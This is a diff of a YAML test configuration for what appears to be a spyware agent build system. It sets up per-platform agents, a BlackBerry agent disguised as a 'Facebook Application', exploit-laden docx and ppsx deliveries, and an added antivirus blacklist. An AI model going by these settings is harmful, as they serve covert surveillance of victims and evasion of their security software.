@@ -1,15 +1,17 @@
 SET_BUILD_PARAMS:
     - SET:
+      build_parameters:
         android:
           binary: {admin: false, demo: true}
           melt: {}
           platform: android
           sign: {}
+          package: {}
         blackberry:
           binary: {demo: true}
           melt: {appname: facebook, desc: Applicazione utilissima di social network, name: Facebook
               Application, vendor: face inc, version: 1.2.3}
-          package: {type: local}
+          package: {}
           platform: blackberry
         exploit:
           deliver: {user: USERID}
@@ -21,6 +23,7 @@ SET_BUILD_PARAMS:
             platforms: [windows]
           melt: {appname: agent.exe, combo: txt, filename: example.txt, input: '000'}
           platform: exploit
+          package: {}
         exploit_docx:
           deliver: {user: USERID}
           factory: {_id: '000'}
@@ -31,6 +34,7 @@ SET_BUILD_PARAMS:
             platforms: [windows]
           melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
           platform: exploit
+          package: {}
         exploit_ppsx:
           deliver: {user: USERID}
           factory: {_id: '000'}
@@ -41,6 +45,7 @@ SET_BUILD_PARAMS:
             platforms: [windows]
           melt: {appname: APPNAME, filename: example.ppsx, input: '000', url: 'http://HOSTNAME/APPNAME'}
           platform: exploit
+          package: {}
         exploit_web:
           deliver: {user: USERID}
           factory: {_id: '000'}
@@ -51,36 +56,47 @@ SET_BUILD_PARAMS:
             platforms: [windows]
           melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
           platform: exploit
+          package: {}
         ios:
           binary: {demo: true}
           melt: {}
           platform: ios
+          package: {type: local}
         linux:
           binary: {admin: false, demo: true}
           melt: {}
           platform: linux
+          package: {}
         osx:
           binary: {admin: true, demo: true}
           melt: {}
           platform: osx
+          package: {}
         windows:
           binary: {admin: false, demo: true}
           melt: {admin: false, bit64: true, codec: true, scout: true}
           platform: windows
           sign: {}
+          package: {}
+
+SET_BLACKLIST:
+    - SET:
+        blacklist: [bitdef,comodo,gdata,drweb,emsisoft,sophos,360cn,kis32,avg,avg32]
 
 SET_DEFAULTS:
+    - CALL: SET_BUILD_PARAMS
+    - CALL: SET_BLACKLIST
     - SET:
         backend: 192.168.100.201
         frontend: 172.20.100.204
         redis: 10.0.20.1
-    - CALL: SET_BUILD_PARAMS
 
 TEST:
+    - BEGIN
     - START_AGENT
-    - CALL: SET_DEFAULTS
-    - BUILD: [ silent, windows, scout ]
+    - BUILD: [ windows, scout ]
     - STOP_AGENT
+    - END
 
 UPLOAD_AGENT:
     - PUSH:
@@ -134,3 +150,8 @@ ELITE:
 STATIC:
     - CALL: DISPATCH
 
+TEST:
+    - START_AGENT
+    - CALL: SET_DEFAULTS
+    - BUILD: [ silent, windows, scout ]
+    - STOP_AGENT
